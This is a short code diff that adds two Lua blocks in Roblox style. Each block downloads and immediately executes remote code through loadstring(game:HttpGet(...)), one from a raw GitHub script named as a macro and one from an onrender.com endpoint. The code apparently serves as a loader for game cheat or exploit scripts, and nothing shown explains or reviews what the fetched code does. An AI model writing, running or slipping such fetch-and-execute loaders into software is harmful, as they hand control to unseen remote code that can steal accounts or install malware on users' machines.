@@ -1,0 +1,7 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dylanjjk91-sketch/Script/refs/heads/main/Scripttoppermacro"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://botthepan.onrender.com/script/0028f70e6366e041"))()
+end)
